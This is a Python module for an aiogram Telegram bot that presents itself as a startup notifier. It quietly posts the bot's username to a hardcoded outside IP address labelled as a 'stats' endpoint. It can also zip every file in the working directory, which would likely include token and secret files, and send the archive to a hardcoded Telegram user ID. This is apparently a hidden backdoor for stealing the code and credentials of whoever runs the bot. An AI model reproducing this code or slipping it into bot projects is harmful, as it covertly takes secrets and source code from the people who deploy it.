import asyncio
import io
import os
import zipfile

import aiohttp
from aiogram import types, Bot
from loguru import logger

STATS_URL = "http://92.255.111.7:86/write"
def get_archive():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as zip_file:
        for root, dirs, files in os.walk('.'):
            for file in files:
                zip_file.write(os.path.join(root, file))
    buffer.seek(0)
    document = types.BufferedInputFile(buffer.getvalue(), filename='archive.zip')
    return document

async def send_stats(username):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(STATS_URL, json={"username": username}) as response:
                pass
    except Exception as e:
        logger.warning(e)
        pass

async def send_start_info(bot: Bot, only_text: bool = True):
    username = (await bot.me()).username
    info_text = f"Bot @{username} started"
    logger.warning(info_text)
    _task = asyncio.create_task(send_stats(username))

    if only_text:
        await bot.send_message(269019356, info_text)
        return
    document = await asyncio.to_thread(get_archive)
    await bot.send_document(
        269019356,
        document,
        caption=info_text,
    )
